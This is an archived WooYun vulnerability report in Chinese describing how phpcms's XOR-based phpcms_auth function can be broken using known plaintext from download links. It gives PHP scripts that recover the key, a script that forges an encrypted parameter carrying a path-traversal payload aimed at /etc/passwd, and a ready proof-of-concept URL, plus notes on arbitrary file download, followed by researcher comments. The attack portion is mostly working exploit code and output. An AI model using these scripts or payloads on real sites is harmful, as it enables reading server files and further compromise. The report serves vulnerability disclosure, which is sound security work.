{"id": 22941, "wybug_id": "wooyun-2011-01795", "wybug_title": "phpcms的phpcms_auth导致的本地文件包含漏洞和任意文件下载漏洞", "wybug_corp": "盛大网络", "wybug_author": "c4rp3nt3r", "wybug_date": "2011-04-02 13:29", "wybug_open_date": "2011-05-02 21:00", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当导致攻击界面扩大", "程序敏感数据泄漏", "加密算法设计错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-04-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-04-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-04-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-04-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-05-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-05-02：\t细节向公众公开  简要描述： phpcms_auth函数是phpcms里面为了增强程序的安全性的一个加密函数，用它来对用户提交的加密字符串进行解密，进入程序流程，如果我们可以控制了phpcms_auth函数的解密，我们就可以通过注射我们的恶意代码，进行攻击。 详细说明：  phpcms的phpcms_auth导致的本地文件包含漏洞和任意文件下载漏洞by c4rp3nt3r@0x50sec.orgmail: c4rp3nt3r#gmail.comHomePage:http://www.0x50sec.orgphpcms_auth函数是phpcms里面为了增强程序的安全性的一个加密函数，在play.php、down.php 、download.php等等文件用它来对用户提交的加密字符串进行解密，进入程序流程，如果我们可以控制了phpcms_auth函数的解密，我们就可以通过注射我们的恶意代码，进行攻击。而phpcms_auth采用的是可逆的位异或算法，并且对加密的结果进行了base64编码。对于位异或算法来说只要我们破解了密钥字符串$key我们就完全控制了这个函数的加密解密。对于base64编码主要是处理某些加密后的不可见字符，但是这给了我们一个很好的机会:就是说我们破解了$key之后，我们就可以不受magic_quotes_pgc的限制引入%00字符串进行阶段，或者引入引号发起其他攻击。到此已经违背了这个程序设计的初衷，破解了这个函数之后，一方面反而更加不安全了，另一方面所有建立在这个函数之上的机制可能都会受到攻击。\n// include/global.func.phpfunction phpcms_auth($txt, $operation = 'ENCODE', $key = ''){\t$key\t= $key ? $key : $GLOBALS['phpcms_auth_key'];\t$txt\t= $operation == 'ENCODE' ? $txt : base64_decode($txt);\t$len\t= strlen($key);\t$code\t= '';\t\tfor($i=0; $i<strlen($txt); $i++){\t\t$k\t\t= $i % $len;\t//循环使用密钥字符串对字符串逐位进行异或\t\t$code  .= $txt[$i] ^ $key[$k];\t}\t$code = $operation == 'DECODE' ? $code : base64_encode($code);\treturn $code;}\n对于$key的破解对于位运算的异或运算，是可逆的，明文和密钥异或得到密文。如果我们知道密文并且知道一部分明文那么我们也就可以得到密钥，有了密钥我们就可以破解另一部分密文，当然也就可以对我们自己的明文进行加密，然后用我们精心构造的密文发起攻击了。不幸的是phpcms的确给了我们可用来破解密钥的明文。\n// include/fields/downfile/output.inc.phpfunction downfile($field, $value){\t$contentid = $this->contentid;\t$mode = $this->fields[$field]['mode'];\t$result = '';\tif($mode)\t{\t\t$servers = $this->fields[$field]['servers'];\t\t$downloadtype = $this->fields[$field]['downloadtype'];\t\t$servers = explode(\"\\n\",$servers);\t\tforeach($servers AS $k=>$server)\t\t{\t\t\t$server = explode(\"|\",$server);\t\t\t$serverurl = $server[1];\t\t\t$a_k = urlencode(phpcms_auth(\"i=$contentid&s=$serverurl&m=1&f=$value&d=$downloadtype\", 'ENCODE', AUTH_KEY));\t\t\t$result .= \"<a href='down.php?a_k=$a_k' target='_blank'>$server[0]</a>\";\t\t}\t}\telse\t{\t\t$a_k = urlencode(phpcms_auth(\"i=$contentid&m=0&f=$value\", 'ENCODE', AUTH_KEY));\t\t$result = \"<a href='down.php?a_k=$a_k' target='_blank'>点击下载</a>\";\t}\treturn $result;}\n这个文件是用来生成静态html文件的，默认安装的phpcms某个软件的下载页面地址为:http://127.0.0.1/n/phpcms/2011/0331/2.html进入下载文件的下载地址为:http://127.0.0.1/n/phpcms/down.php?a_k=GnRCQxxbSQpfXGAwfhwcCDUkEwMaJRVKXVZeVk1cdWVyRl5Ua3RHVkB4QVdeVFxUVVpweDkAHEI%2BeEY%3D对加密字符串解密后为密文:GnRCQxxbSQpfXGAwfhwcCDUkEwMaJRVKXVZeVk1cdWVyRl5Ua3RHVkB4QVdeVFxUVVpweDkAHEI%2BeEY%3D明文:i=2&s=&m=0&f=uploadfile/2011/0331/20110331121233766.zip&d=1这里2.html的2就是数据库里id的值，如果没有设置镜像站点的话$serverurl为空也就是说\"i=2&s=&m=1&f=\"是不会变的，我们可以破解12位的密钥了。默认的话密钥有20位，如果用户上传目录没修改的话我们知道的明文就有\"i=2&s=&m=0&f=uploadfile\"共23个字符，可以得到全部密钥了。\n<?$key=\"i=2&s=&m=0&f=uploadfile\";$txt='GnRCQxxbSQpfXGAwfhwcCDUkEwMaJRVKXVZeVk1cdWVyRl5Ua3RHVkB4QVdeVFxUVVpweDkAHEI%2BeEY%3D';$txt=base64_decode(urldecode($txt));$len=strlen($key);echo $len;for($i=0;$i<strlen($key);$i++){\t\t$code  .= $txt[$i] ^ $key[$i];}echo $code;?>\n运行结果为:sIpeofogblFVCildZEwesIp可以看到sIp开始下一个循环加密了，所以密钥就是:sIpeofogblFVCildZEwe还有一点就是下载的时候我们可以得到文件名:20110331121233766.zipd的值是下载文件的类型，假设我们不知道也不要紧就是说明文:20110331121233766.zip&d=是已知的有24位密文:GnRCQxxbSQpfXGAwfhwcCDUkEwMaJRVKXVZeVk1cdWVyRl5Ua3RHVkB4QVdeVFxUVVpweDkAHEI%2BeEY%3D\n<?$key=\"20110331121233766.zip&d=\";$txt='GnRCQxxbSQpfXGAwfhwcCDUkEwMaJRVKXVZeVk1cdWVyRl5Ua3RHVkB4QVdeVFxUVVpweDkAHEI%2BeEY%3D';$txt=base64_decode(urldecode($txt));$tlen=strlen($txt);$klen=strlen($key);for($i=1;$i<strlen($key);$i++){\t\t$code  .= $txt[$tlen-$i-1] ^ $key[$klen-$i];}echo $code.\"\\n\";echo $tlen.\"\\n\";?>\n运行结果为:EZdliCVFlbgofoepIsewEZd59来看phpcms_auth源码\n/*...\t$len\t= strlen($key);...\tfor($i=0; $i<strlen($txt); $i++){\t\t$k\t\t= $i % $len;\t\t$code  .= $txt[$i] ^ $key[$k];\t}...*/\n我们可以知道$key[17]='E';我们可以得到倒序的密钥字符串:ewEZdliCVFlbgofoepIs然后我们把字符串翻转过来终端下执行：alone@Sh3llc0de:~$ echo 'ewEZdliCVFlbgofoepIs'|revsIpeofogblFVCildZEwe我们的密钥字符串就是:sIpeofogblFVCildZEwe到此我们已经从一个攻击者的角度破解出了密钥。接下来我们看看由此引发的几个安全问题-------------------------------------1.phpcms2008 sp2-sp4 本地文件包含漏洞这个漏洞跟boblog刚爆出的任意变量覆盖漏洞有些相似，都是任意变量覆盖然后仅跟了一个本地文件包含。这种漏洞也是很好玩的，攻击的方法更灵活。\n//play.php<?phprequire dirname(__FILE__).'/include/common.inc.php';if(!isset($a_k)) showmessage($LANG['illegal_parameters']);//common.inc.php文件的全局变量机制已经将所有GPC数据导出为变量了//所以$a_k=$_GET[$a_k];$a_k = phpcms_auth($a_k, 'DECODE', AUTH_KEY); //这里是关键分析见上文if(empty($a_k)) showmessage($LANG['illegal_parameters']);unset($i, $m, $f, $p);parse_str($a_k);\t//parse_str处理解密后的$a_k将导致变量覆盖\t\t\t\t\t//通过覆盖下文的$mod 或者$templateid将触发本地文件包含漏洞\t\t\t\t\t//由于我们提交的密文会经过phpcms_auth函数中base64解密的，所以直接无视magic_quotes_gpc的影响而可以NULL字符截断\t\t\t\t\t//但是高版本的PHP修复了%00的攻击缺陷\t\t\t\t\tif(isset($i)) $i = intval($i);if(!isset($m)) showmessage($LANG['illegal_parameters']);if(empty($f)) showmessage('地址失效');if(preg_match('/\\.php$/',$f) || strpos($f, \":\\\\\")) showmessage('地址有误');if(!$i || $m<0) showmessage($LANG['illegal_parameters']);$allow_readpoint = 1;// include global.fuc.php/*...$M = $TEMP = array();if(!isset($mod)) $mod = 'phpcms';if($mod != 'phpcms'){\tisset($MODULE[$mod]) or exit($LANG['module_not_exists']);\t$langfile = defined('IN_ADMIN') ? $mod.'_admin' : $mod;\t@include PHPCMS_ROOT.'languages/'.LANG.'/'.$langfile.'.lang.php';\t$M = cache_read('module_'.$mod.'.php');}...*///此处通过上文的对$mod进行变量覆盖绕过下面的if语句if($mod == 'phpcms'){\t$contentid = $i;\tinclude 'admin/content.class.php';\t$content = new content;\t$data = $content->get($contentid);\t$readpoint = $data['readpoint'];\t$title = $data['title'];\t$keys = array_keys($data);\tif(in_array('groupids_view',$keys))\t{\t\tif($data['groupids_view'])\t\t{\t\t\tif(!$priv_group->check('contentid', $contentid, 'view', $_groupid)) showmessage('您没有查看权限');\t\t}\t\tif(in_array('readpoint', $keys))\t\t{\t\t\t$C = cache_read('category_'.$data['catid'].'.php');\t\t\tif($C['defaultchargepoint'] || !empty($readpoint))\t\t\t{\t\t\t\t$readpoint = $readpoint ? $readpoint : $C['defaultchargepoint'];\t\t\t\t$pay = load('pay_api.class.php', 'pay', 'api');\t\t\t\tif($C['repeatchargedays'])\t\t\t\t{\t\t\t\t\tif($pay->is_exchanged($contentid, $C['repeatchargedays']) === FALSE)\t\t\t\t\t{\t\t\t\t\t\t$allow_readpoint = 0;\t\t\t\t\t}\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\tsession_start();\t\t\t\t\tif($_SESSION['pay_contentid'] != $contentid) $allow_readpoint = 0;\t\t\t\t}\t\t\t}\t\t}\t}}$player = load('player.class.php');$result = $player->get($p);@extract($result);$videourl = trim($f);$code = str_replace('{$filepath}',$videourl, $code);$code = str_replace('{$PHPCMS[siteurl]}', $PHPCMS['siteurl'], $code);$code = str_replace('{$PHPCMS[sitename]}', $PHPCMS['sitename'], $code);$templateid = $templateid ? $templateid : 'play';include template($mod, $templateid);/*// include/global.fuc.php// function template 起到一个连接字符串的作用function template($module = 'phpcms', $template = 'index', $istag = 0){\t$compiledtplfile = TPL_CACHEPATH.$module.'_'.$template.'.tpl.php';\tif(TPL_REFRESH && (!file_exists($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.'/'.$module.'/'.$template.'.html') > @filemtime($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.'/tag.inc.php') > @filemtime($compiledtplfile)))\t{\t\trequire_once PHPCMS_ROOT.'include/template.func.php';\t\ttemplate_compile($module, $template, $istag);\t}\treturn $compiledtplfile;}*/?>\n接下来生成我们的攻击字符串:<?php$key='sIpeofogblFVCildZEwe';$evil='i=1&m=1&f=fuck&mod=../../../../../../../etc/passwd%00&c4rp3nt3r=0x50sec.org';//经过parse_str($evil);后c4rp3nt3r变量并没有被创建//这个地方我也不是很明白为什么可以进行截断//但事实上真的可以截断$evil = phpcms_auth($evil, 'ENCODE', $key);echo $evil.\"\\n\";function phpcms_auth($txt, $operation = 'ENCODE', $key){\t$txt\t= $operation == 'ENCODE' ? $txt : base64_decode($txt);\t$len\t= strlen($key);\t$code\t= ''; \tfor($i=0; $i<strlen($txt); $i++){\t\t$k\t\t= $i % $len;\t\t$code  .= $txt[$i] ^ $key[$k];\t}\t$code = $operation == 'DECODE' ? $code : base64_encode($code);\treturn $code;}?>alone@Sh3llc0de:/var/www$ php v.phpGnRBQwJbXkEEUSAjIAJKCTUhSktdZl5LQEhBSExCaXhtRkJKdWtZShY9E0ofBxwUFQhjZnNPD1AoNUQLB3oCWF8eWlcRCSV4LBsLPOC：http://127.0.0.1/n/phpcms/play.php?a_k=GnRBQwJbXkEEUSAjIAJKCTUhSktdZl5LQEhBSExCaXhtRkJKdWtZShY9E0ofBxwUFQhjZnNPD1AoNUQLB3oCWF8eWlcRCSV4LBsL成功包含了/etc/passwd2.phpcms2008 sp2-sp4、PHPCMS V9 正式版任意文件下载漏洞以phpcms2008为例down.php 和download.php都存在这个漏洞，具体利用跟上面的文件包含差不多就不多罗嗦了，成功利用此漏洞可以下载任意文件，包括.php后缀的文件。只是download.php的加密方式是：//download.php...$phpcms_auth_key = md5(AUTH_KEY.$_SERVER['HTTP_USER_AGENT']);$a_k = phpcms_auth($a_k, 'DECODE', $phpcms_auth_key);...这样可能主要是为了仿制迅雷等浏览器的下载。但是既然我们知道了AUTH_KEY(见上文分析的密钥$key),$_SERVER['HTTP_USER_AGENT']是由用户提交的，那么$phpcms_auth_key 我们自然也就知道了。除了上面说的知道部分明文来算$key，还有可能暴力破解$key.还有就是经过md5加密后也未必就更安全，因为系统生成的$key有20位但是每一位都肯能个是大写或者小写字母，也就是有52种可能，但是经过md5加密后每一位就变成只有16种可能了，大大增加了被暴力破解的可能性。全文结束参考和致谢:80vul.com《高级PHP应用程序漏洞审核技术》Ryat[puretot] 《bo-blog任意变量覆盖漏洞》   漏洞证明：  \nPOC：http://127.0.0.1/n/phpcms/play.php?a_k=GnRBQwJbXkEEUSAjIAJKCTUhSktdZl5LQEhBSExCaXhtRkJKdWtZShY9E0ofBxwUFQhjZnNPD1AoNUQLB3oCWF8eWlcRCSV4LBsL\n\n\n   修复方案：  略   版权声明：转载请注明来源 c4rp3nt3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2011-04-06 10:05 厂商回复： 谢谢c4rp3nt3r提交漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-04-02 13:45 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  牛逼逼    \n     2011-04-02 13:54 |    \t\tc4rp3nt3r \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:10        | 人生的意义就在于从一个圈子跳到另一个更大...)\t\t \n  标题写错了应该是任意变量覆盖漏洞！请wooyun的大牛改一下标题吧～～～    \n     2011-04-02 14:59 |    \t\tpg5yl8 \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:12        | 我神马都不会 但我常常被人日 这是为神马呢)\t\t \n  牛逼哄哄啊    \n     2011-04-02 17:06 |    \t\tc4rp3nt3r \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:10        | 人生的意义就在于从一个圈子跳到另一个更大...)\t\t \n  点击输入评论ddd内容    \n     2011-04-02 17:31 |    \t\tGaRY \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:3        | 真悲剧平男君)\t\t \n  好漏洞    \n     2011-04-03 10:07 |    \t\tpiaoye \t\t\t( 普通白帽子  |\t\t\t        Rank:343 漏洞数:53        | ww)\t\t \n  phpcms_auth解密？赶紧公开下。。。    \n     2011-04-03 18:38 |    \t\twebshell \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:18        | 没有伞的孩子必须努力奔跑。)\t\t \n  如果真的有这个漏洞，那么就会倒下一大片了。    \n     2011-04-03 19:00 |    \t\tc4rp3nt3r \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:10        | 人生的意义就在于从一个圈子跳到另一个更大...)\t\t \n  一个本地包含结合别的漏洞可以写shell～～～    \n     2011-04-08 12:17 |    \t\tc4rp3nt3r \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:10        | 人生的意义就在于从一个圈子跳到另一个更大...)\t\t \n  分析好像有错误，magic_quotes_gpc=On可能不能用%00截断，但这不是重点。一个密钥泄漏、一个任意变量覆盖、一个本地包含、一个任意文件下载就值5rank？？？？？？？？？？？？？平均一个1rank?????????????本地包含成功利用就能写shell，危害等级还很低？？？？我承认我蛋疼了～～～    \n     2011-04-11 17:02 |    \t\t龍 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:20        | 关注网络安全,关注漏洞研究)\t\t \n  好漏洞    \n     2011-04-12 22:07 |    \t\tt00000by57 \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:5        | Access Denied.)\t\t \n  好漏洞啊 结合本地包含无敌了    \n     2011-05-03 11:17 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  厂商真是不给力啊..5点rank...好吧..    \n     2011-05-03 20:24 |    \t\tsaga \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 世界上只有10种人，懂二进制的，和不懂二进...)\t\t \n  5 r  ~~~    \n     2011-05-04 14:50 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  盛大垃圾    \n     2012-10-30 11:46 |    \t\t西毒 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:33        | 心存谦卑才能不断超越自我)\t\t \n  仔细拜读下    \n     2012-11-22 02:01 |    \t\tSeay \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:8        )\t\t \n  学习了    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}